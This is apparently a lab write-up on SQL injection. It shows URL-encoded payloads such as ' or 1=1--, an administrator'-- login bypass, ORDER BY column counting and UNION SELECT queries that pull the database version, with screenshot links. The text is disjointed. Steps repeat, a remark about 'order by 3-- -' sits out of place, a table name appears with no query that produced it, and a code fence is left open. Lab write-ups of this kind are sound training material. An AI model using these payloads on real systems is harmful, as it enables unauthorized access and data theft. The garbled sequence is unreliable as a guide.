To display one or more unreleased products, we can use the payload ```' or 1=1--```, make sure this is url encoded to something like this ```'+or+1%3d1--```.

Adding this payload to the url,

So we are asked to login as the ```administrator``` user, to do this we can use this

username:```administrator'--```          password:```aaaaaaa```

Note: We can either provide a blank password or we use any random stuff for the password since the password will get commented out anyways

Capturing the request on burpsuite,

First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

Trying other queries

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```
Trying the query

From the above screenshot you'll see that the query ```' order by 3-- -``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

Now, to display the database version string, we can use  the query

We got an Internal Server Error here, this means there isn't a column 3 available in the database.

Hence, we have 2 columns available in the database.

Lets try to get the version the database is running, we can use the query
```
' UNION SELECT version(),null--
```

We found a table ```users_vqdnay```.

Next thing to do is to check the name of the columns in the table, we can use the query

' order by 1--
' order by 2--
' order by 3--
```
Ensure the queries are url encoded before applying them
